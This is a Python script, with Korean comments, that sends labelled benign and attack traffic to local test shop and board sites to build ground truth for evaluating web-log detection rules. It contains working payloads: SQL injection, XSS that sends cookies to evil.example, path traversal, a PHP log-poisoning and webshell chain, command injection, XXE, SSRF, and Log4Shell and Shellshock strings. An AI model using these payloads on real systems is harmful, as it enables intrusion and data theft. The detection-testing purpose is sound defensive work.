#!/usr/bin/env python3
"""
로컬 테스트 사이트를 상대로 "정답을 아는" 트래픽을 만든다.

- 정상 사용자 트래픽(브라우저·검색엔진 봇·정적 파일, 그리고 정상인데 공격처럼 보이는
  검색어 — 오탐을 시험하는 함정)과, 공격 시나리오를 서로 다른 (문서용) IP로 보낸다.
- 각 시나리오의 기대 규칙을 ground_truth.json 에 기록한다.
- "detectable": false 인 시나리오는 접속 로그로는 볼 수 없는 공격(사각지대)이다. 채점 때
  재현율에 넣지 않고 따로 보고한다. 숨기지 않기 위해 남긴다.
- 공격은 오직 이 로컬 서버(127.0.0.1)에만 보낸다.
"""
from __future__ import annotations

import json
import subprocess
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path

LAB = Path(__file__).resolve().parent
SHOP = "http://127.0.0.1:8081"
BOARD = "http://127.0.0.1:8082"
SHOP_ACCESS_LOG = LAB / "logs" / "shopmall_access.log"
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/140.0 Safari/537.36")
GOOGLEBOT_UA = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

truth: list[dict] = []


def req(url, ip, ua=BROWSER_UA, method="GET", data=None, form=None, cookie=None, referer=None):
    """요청 한 번. 응답 코드를 돌려준다. X-Forwarded-For 로 클라이언트 IP를 흉내 낸다."""
    cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
           "-H", f"X-Forwarded-For: {ip}", "-A", ua, "-X", method]
    if cookie:
        cmd += ["-H", f"Cookie: {cookie}"]
    if referer:
        cmd += ["-e", referer]
    for k, v in (data or {}).items():
        cmd += ["--data-urlencode", f"{k}={v}"]
    if data and method == "GET":
        cmd += ["-G"]
    for k, path in (form or {}).items():
        cmd += ["-F", f"{k}=@{path}"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout.strip()


def body(url, ip, cookie=None, ua=BROWSER_UA, data=None):
    """응답 본문을 돌려준다(공격 성공 여부를 실제로 확인할 때 쓴다)."""
    cmd = ["curl", "-s", "-H", f"X-Forwarded-For: {ip}", "-A", ua]
    if cookie:
        cmd += ["-H", f"Cookie: {cookie}"]
    for k, v in (data or {}).items():
        cmd += ["--data-urlencode", f"{k}={v}"]
    if data:
        cmd += ["-G"]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def record(scenario, site, ip, rules, desc, malicious=True, detectable=True):
    truth.append({"scenario": scenario, "site": site, "attacker_ip": ip,
                  "expected_rules": rules, "description": desc,
                  "malicious": malicious, "detectable": detectable})


# ------------------------------------------------------------------ 정상 사용자
def benign():
    """정상 사용자 — 아무 규칙에도 안 걸려야 한다(오탐 측정). 검색어 함정 포함."""
    for ip in ("203.0.113.10", "203.0.113.11", "203.0.113.12"):
        req(f"{SHOP}/", ip)
        req(f"{SHOP}/static/style.css", ip)
        req(f"{SHOP}/product.php?id={3 + int(ip[-1])}", ip)
        req(f"{SHOP}/search.php", ip, data={"q": "노트북"})
        req(f"{SHOP}/login.php", ip, method="POST", data={"username": "guest", "password": "guest"})
    # 함정: 따옴표·단어가 SQL처럼 보이지만 정상인 검색어
    for ip, q in (("203.0.113.30", "select color from menu"),
                  ("203.0.113.31", "keyboard and mouse"),
                  ("203.0.113.32", "1 or 2 people headset")):
        req(f"{SHOP}/search.php", ip, data={"q": q})
    # 검색엔진 봇
    req(f"{SHOP}/robots.txt", "203.0.113.40", ua=GOOGLEBOT_UA)
    req(f"{SHOP}/product.php?id=7", "203.0.113.40", ua=GOOGLEBOT_UA)
    req(f"{SHOP}/product.php?id=8", "203.0.113.40", ua=GOOGLEBOT_UA)
    # 후기 등록(정상 사용자)
    req(f"{SHOP}/review.php", "203.0.113.41", method="POST",
        data={"product_id": "3", "author": "민지", "body": "배송 빠르고 좋아요"})
    # 게시판(정상)
    for ip in ("203.0.113.20", "203.0.113.21"):
        req(f"{BOARD}/", ip)
        req(f"{BOARD}/bbs/list.php", ip, data={"id": "1"})
        req(f"{BOARD}/bbs/download.php", ip, data={"file": "notice.txt"})
        req(f"{BOARD}/bbs/login.php", ip, method="POST", data={"uid": "tester", "pw": "1234"})
    record("benign", "both", "203.0.113.*", [], "정상 사용자·검색엔진 봇·함정 검색어", malicious=False)


# ------------------------------------------------------------------ 정찰·탐색
def scan_recon():
    ip = "198.51.100.50"
    paths = ["/wp-login.php", "/wp-admin/", "/administrator/", "/phpmyadmin/", "/.git/HEAD",
             "/backup.zip", "/old/", "/test.php", "/config.bak", "/manager/html",
             "/xmlrpc.php", "/vendor/phpunit/", "/server-status", "/.svn/entries",
             "/cgi-bin/test.cgi", "/shell.php", "/db.sql", "/info.php", "/api/v1/users"]
    for p in paths:
        req(f"{SHOP}{p}", ip, ua="sqlmap/1.8.3#stable (https://sqlmap.org)")
    record("scanner_recon", "shopmall", ip, ["WEBLOG_SCANNER", "WEBLOG_ENUM_404"],
           "스캐너 UA + 없는 경로 20개 연속 탐색")


def sensitive_files():
    ip = "198.51.100.25"
    for p in ["/.env", "/config.php", "/wp-config.php", "/.git/config"]:
        req(f"{SHOP}{p}", ip)
    record("sensitive_files", "shopmall", ip, ["WEBLOG_SENSITIVE_FILE"], "설정·비밀 파일 접근 시도")


# ------------------------------------------------------------------ 침투
def sqli_union():
    ip = "198.51.100.23"
    for q in ["' UNION SELECT username,password FROM users-- -",
              "' OR '1'='1", "%' UNION SELECT username,password FROM users-- -",
              "' AND 1=2 UNION SELECT username,password FROM users-- -"]:
        req(f"{SHOP}/search.php", ip, data={"q": q})
    ipb = "198.51.100.63"
    for q in ["0 UNION SELECT uid,pw FROM members", "1 AND 1=1", "1; DROP TABLE x--",
              "0 UNION SELECT uid,pw FROM members-- -"]:
        req(f"{BOARD}/bbs/list.php", ipb, data={"id": q})
    record("sqli_union", "shopmall", ip, ["WEBLOG_SQLI"], "검색창 UNION 기반 계정정보 추출")
    record("sqli_union", "board", ipb, ["WEBLOG_SQLI"], "게시물 id UNION 기반 추출")


def sqli_bulk_dump():
    """항상 참인 조건으로 상품 2,000개를 한꺼번에 빼낸다 → 큰 응답이 나가는지 본다."""
    ip = "198.51.100.28"
    got = body(f"{SHOP}/search.php", ip, data={"q": "' OR 1=1 -- "})
    record("sqli_bulk_dump", "shopmall", ip, ["WEBLOG_SQLI", "WEBLOG_LARGE_EXFIL"],
           f"항상 참 조건으로 전체 목록 덤프(응답 {len(got):,}자)")


def xss_reflected():
    ip = "198.51.100.29"
    req(f"{SHOP}/search.php", ip, data={"q": "<script>document.location='http://evil.example/?c='+document.cookie</script>"})
    req(f"{SHOP}/search.php", ip, data={"q": "\"><img src=x onerror=alert(1)>"})
    record("xss_reflected", "shopmall", ip, ["WEBLOG_XSS"], "검색어로 쿠키 탈취 스크립트 반사")


def stored_xss_review():
    """후기 본문에 스크립트를 저장한다. 접속 로그에는 POST 본문이 남지 않으므로 탐지 불가(사각지대)."""
    ip = "198.51.100.31"
    req(f"{SHOP}/review.php", ip, method="POST",
        data={"product_id": "5", "author": "guest", "body": "<script>fetch('http://evil.example/?c='+document.cookie)</script>"})
    record("stored_xss_review", "shopmall", ip, [],
           "후기 본문에 저장형 XSS 스크립트 저장(POST 본문은 접속 로그에 없음)", detectable=False)


def traversal_lfi():
    ip = "198.51.100.24"
    for p in ["../../../../../../etc/passwd", "../../../../etc/passwd%00",
              "....//....//....//etc/passwd"]:
        req(f"{SHOP}/view.php", ip, data={"page": p})
    ipb = "198.51.100.64"
    req(f"{BOARD}/bbs/download.php", ipb, data={"file": "../../../../../../etc/passwd"})
    record("traversal_lfi", "shopmall", ip, ["WEBLOG_TRAVERSAL"], "경로 조작으로 /etc/passwd 열람")
    record("traversal_lfi", "board", ipb, ["WEBLOG_TRAVERSAL"], "다운로드 경로 조작")


def log_poisoning_rce():
    """LFI → 로그 포이즈닝 → 실행. 1) User-Agent에 PHP 코드를 심어 접속 로그에 남기고
    2) 언어 파일 include 취약점으로 그 로그를 읽어 실행시킨다. 실제로 명령이 실행되는지 확인한다."""
    ip = "198.51.100.32"
    req(f"{SHOP}/product.php?id=2", ip, ua="<?php system($_GET['c']); ?>")
    out = body(f"{SHOP}/lang.php", ip, data={"f": str(SHOP_ACCESS_LOG), "c": "id"})
    executed = "uid=" in out
    record("log_poisoning_rce", "shopmall", ip, ["WEBLOG_CODE_IN_HEADER", "WEBLOG_TRAVERSAL"],
           "UA에 PHP 코드 심기 → include로 접속 로그 실행" + ("(명령 실행 확인)" if executed else "(실행 실패)"))
    truth[-1]["verified_executed"] = executed


def cmd_injection():
    ip = "198.51.100.65"
    for h in ["127.0.0.1;id", "127.0.0.1;cat /etc/passwd", "x|id", "x;uname -a"]:
        req(f"{BOARD}/admin/tools.php", ip, data={"host": h})
    record("cmd_injection", "board", ip, ["WEBLOG_CMD_INJECTION"], "점검 도구 host 파라미터 명령 삽입")


def brute_login():
    ip = "198.51.100.26"
    for i in range(15):
        req(f"{SHOP}/login.php", ip, method="POST", data={"username": "admin", "password": f"guess{i}"})
    req(f"{SHOP}/login.php", ip, method="POST", data={"username": "admin", "password": "S3cretPass!"})
    record("brute_login", "shopmall", ip,
           ["WEBLOG_AUTH_BRUTE", "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"],
           "로그인 15회 실패 뒤 정답으로 성공")
    ipb = "198.51.100.66"
    for i in range(12):
        req(f"{BOARD}/bbs/login.php", ipb, method="POST", data={"uid": "sysop", "pw": f"p{i}"})
    req(f"{BOARD}/bbs/login.php", ipb, method="POST", data={"uid": "sysop", "pw": "Adm!n2024"})
    record("brute_login", "board", ipb,
           ["WEBLOG_AUTH_BRUTE", "WEBLOG_AUTH_SUCCESS_AFTER_FAIL"], "게시판 로그인 무차별 대입")


def default_admin_takeover():
    """설치 후 바꾸지 않은 기본 관리자 계정으로 들어가 회원·상품 목록을 통째로 내려받는다."""
    ip = "198.51.100.33"
    req(f"{SHOP}/admin/members.php", ip)                       # 1) 인증 없이 접근 → 로그인으로 튕김
    req(f"{SHOP}/admin/login.php", ip, method="POST",          # 2) 기본 계정 로그인 성공
        data={"username": "shopadmin", "password": "admin"})
    out = body(f"{SHOP}/admin/members.php", ip, cookie="admin=1")  # 3) 관리자 목록 내려받기
    record("default_admin_takeover", "shopmall", ip,
           ["WEBLOG_ADMIN_ACCESS", "WEBLOG_LARGE_EXFIL"],
           f"기본 관리자 계정 로그인 후 회원·상품 목록 {len(out):,}자 내려받기")


def webshell_chain():
    """업로드 우회 → 실행 → 명령 실행. .php 는 막히고 .phtml 은 통과해 실행된다(실제 흔한 우회)."""
    ip = "198.51.100.27"
    rt = LAB / "runtime"
    rt.mkdir(exist_ok=True)
    code = "<?php system($_GET['cmd']); ?>\n"
    (rt / "shell.php").write_text(code, encoding="utf-8")
    (rt / "shell.phtml").write_text(code, encoding="utf-8")
    req(f"{SHOP}/upload.php", ip, method="POST", form={"file": str(rt / "shell.php")})     # 막힘(400)
    req(f"{SHOP}/upload.php", ip, method="POST", form={"file": str(rt / "shell.phtml")})   # 통과
    time.sleep(0.3)
    for c in ["id", "uname -a", "cat /etc/passwd"]:
        req(f"{SHOP}/uploads/shell.phtml", ip, data={"cmd": c})
    record("webshell_chain", "shopmall", ip,
           ["WEBLOG_UPLOAD_EXEC", "WEBLOG_WEBSHELL_ACCESS", "FILE_WEBSHELL"],
           "업로드 우회(.php 차단 → .phtml 통과) 후 cmd 파라미터로 실행")


# ------------------------------------------------------------------ 2차: 외부 자료 기반 추가 체인
def ssrf_internal():
    """SSRF: 상품 이미지 가져오기 기능에 내부 주소를 넣어 내부 전용 통계(토큰 포함)를 빼낸다."""
    ip = "198.51.100.35"
    out = body(f"{SHOP}/fetch.php", ip, data={"url": "http://127.0.0.1:8081/internal/stats.php"})
    record("ssrf_internal", "shopmall", ip, ["WEBLOG_SSRF"],
           "이미지 가져오기 기능으로 내부 전용 통계 요청(SSRF)")
    truth[-1]["verified_leak"] = "internal_token" in out


def idor_orders():
    """IDOR: 주문 번호를 1번부터 차례로 바꿔 가며 다른 고객의 수령인·주소·전화번호를 연다."""
    ip = "198.51.100.36"
    for n in range(1, 26):
        req(f"{SHOP}/order.php", ip, data={"id": str(n)})
    record("idor_orders", "shopmall", ip, ["WEBLOG_IDOR_ENUM"],
           "주문 번호 1~25를 차례로 열람해 고객 정보 수집(IDOR)")


def forged_admin():
    """쿠키 위조: 로그인 없이 admin=1 쿠키만 붙여 관리자 회원 목록을 내려받는다."""
    ip = "198.51.100.34"
    out = body(f"{SHOP}/admin/members.php", ip, cookie="admin=1")
    record("forged_admin", "shopmall", ip,
           ["WEBLOG_ADMIN_FORGED", "WEBLOG_ADMIN_ACCESS", "WEBLOG_LARGE_EXFIL"],
           f"로그인 없이 관리자 쿠키만 위조해 목록 {len(out):,}자 내려받기")


def open_redirect():
    """열린 리다이렉트: 로그인 뒤 보낼 주소를 외부 사이트로 바꿔 피싱 연결에 쓴다."""
    ip = "198.51.100.37"
    req(f"{SHOP}/login.php?next=http://evil.example/verify", ip, method="POST",
        data={"username": "guest", "password": "guest"})
    record("open_redirect", "shopmall", ip, ["WEBLOG_OPEN_REDIRECT"],
           "로그인 뒤 외부 사이트로 보내도록 next 주소 조작")


def csrf_admin_delete():
    """CSRF: 관리자가 로그인된 브라우저로 외부 페이지를 열면, 그 페이지가 상품 삭제 요청을 보낸다."""
    ip = "198.51.100.38"
    req(f"{SHOP}/admin/delete_product.php", ip, method="POST", cookie="admin=1",
        data={"id": "1999"}, referer="http://evil.example/prize.html")
    record("csrf_admin_delete", "shopmall", ip, ["WEBLOG_CSRF_SUSPECT"],
           "외부 페이지에서 관리자 상품 삭제 요청(CSRF, 피해자 브라우저)")


def backup_leak():
    """백업 파일 노출: 설치 때 만든 덤프 파일이 웹에 그대로 남아 있어 내려받는다."""
    ip = "198.51.100.39"
    out = body(f"{SHOP}/backup.sql", ip)
    record("backup_leak", "shopmall", ip, ["WEBLOG_BACKUP_LEAK"],
           f"남아 있던 백업 파일 내려받기({len(out):,}자, 계정 정보 포함)")
    truth[-1]["verified_leak"] = "S3cretPass" in out


def git_exposure():
    """소스 노출: 배포할 때 .git 폴더가 웹 루트에 같이 올라가 설정 파일을 내려받을 수 있다."""
    ip = "198.51.100.44"
    out = body(f"{SHOP}/.git/config", ip)
    record("git_exposure", "shopmall", ip, ["WEBLOG_BACKUP_LEAK"],
           "배포 때 같이 올라간 .git 설정 파일 내려받기")
    truth[-1]["verified_leak"] = "remote" in out


def dir_listing():
    """업로드 폴더 목록 공개: 폴더 주소만 열면 올라온 파일 목록이 그대로 보인다."""
    ip = "198.51.100.40"
    out = body(f"{SHOP}/uploads/", ip)
    record("dir_listing", "shopmall", ip, ["WEBLOG_DIR_LISTING"],
           "업로드 폴더 목록 열람")
    truth[-1]["verified_leak"] = "shell.phtml" in out or "Index of" in out


def exploit_probe():
    """알려진 취약점 문자열을 헤더에 넣어 본다(Log4Shell 형식·Shellshock 형식).
    이 서버는 그 취약점을 가지고 있지 않아 실행되지 않는다. 시도 자체를 잡는지 본다."""
    ip = "198.51.100.41"
    req(f"{SHOP}/product.php?id=2", ip, ua="${jndi:ldap://198.51.100.99/a}")
    req(f"{SHOP}/product.php?id=2", ip, ua="() { :; }; /bin/cat /etc/passwd")
    record("exploit_probe", "shopmall", ip, ["WEBLOG_EXPLOIT_PROBE"],
           "Log4Shell·Shellshock 형식 문자열을 User-Agent에 넣어 시도(실행 대상 아님)")


def xxe_import():
    """XXE: 상품 일괄 등록 XML에 외부 파일 엔티티를 넣어 /etc/passwd를 읽는다.
    공격 내용은 POST 본문에만 있어 접속 로그로는 보이지 않는다(사각지대)."""
    ip = "198.51.100.43"
    xml = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
           '<r><product><name>&x;</name></product></r>')
    out = _post_raw(f"{SHOP}/import.php", ip, xml)
    record("xxe_import", "shopmall", ip, [],
           "상품 등록 XML에 외부 파일 엔티티(XXE)로 /etc/passwd 읽기 — POST 본문이라 로그에 없음",
           detectable=False)
    truth[-1]["verified_leak"] = "root:" in out


def _post_raw(url, ip, payload):
    cmd = ["curl", "-s", "-H", f"X-Forwarded-For: {ip}", "-A", BROWSER_UA,
           "-H", "Content-Type: application/xml", "--data-binary", payload, url]
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def write_synthetic_authlog():
    """웹 침해가 서버 계정 탈취로 이어진 상황. auth.log 는 로컬에서 실제 SSH 공격을 돌리기
    어려워 합성한다(공격자 IP를 웹셸 시나리오와 맞춰 교차 상관만 본다)."""
    ip = "198.51.100.27"
    base = datetime.now(timezone.utc).replace(microsecond=0)
    lines = []
    t = base
    for i in range(8):
        t += timedelta(seconds=3)
        lines.append(f"{t.strftime('%b %e %H:%M:%S')} web01 sshd[2200{i}]: "
                     f"Failed password for root from {ip} port 4{i}122 ssh2")
    t += timedelta(seconds=3)
    lines.append(f"{t.strftime('%b %e %H:%M:%S')} web01 sshd[22099]: "
                 f"Accepted password for root from {ip} port 49999 ssh2")
    t += timedelta(seconds=5)
    lines.append(f"{t.strftime('%b %e %H:%M:%S')} web01 sudo:     root : "
                 f"TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m svc")
    (LAB / "logs" / "shopmall_auth.log").write_text("\n".join(lines) + "\n", encoding="utf-8")
    record("ssh_takeover", "shopmall", ip,
           ["SSH_BRUTE_FORCE", "SSH_SUCCESS_AFTER_FAIL"],
           "웹 침해와 같은 IP에서 SSH 무차별 대입 후 root 로그인 성공(합성 auth.log)")


def main():
    benign()
    scan_recon()
    sensitive_files()
    sqli_union()
    sqli_bulk_dump()
    xss_reflected()
    stored_xss_review()
    traversal_lfi()
    log_poisoning_rce()
    cmd_injection()
    brute_login()
    default_admin_takeover()
    webshell_chain()
    ssrf_internal()
    idor_orders()
    forged_admin()
    open_redirect()
    csrf_admin_delete()
    backup_leak()
    git_exposure()
    dir_listing()
    exploit_probe()
    xxe_import()
    write_synthetic_authlog()
    (LAB / "logs" / "ground_truth.json").write_text(
        json.dumps({"generated_at": datetime.now(timezone.utc).isoformat(), "scenarios": truth},
                   ensure_ascii=False, indent=1), encoding="utf-8")
    print(f"트래픽 생성 완료: 시나리오 {len(truth)}개")
    for t in truth:
        tag = "" if t["detectable"] else "  [사각지대]"
        print(f"  [{t['scenario']:20s}] {t['site']:9s} {t['attacker_ip']:15s} "
              f"→ 기대 {', '.join(t['expected_rules']) or '(없음/정상)'}{tag}")


if __name__ == "__main__":
    main()
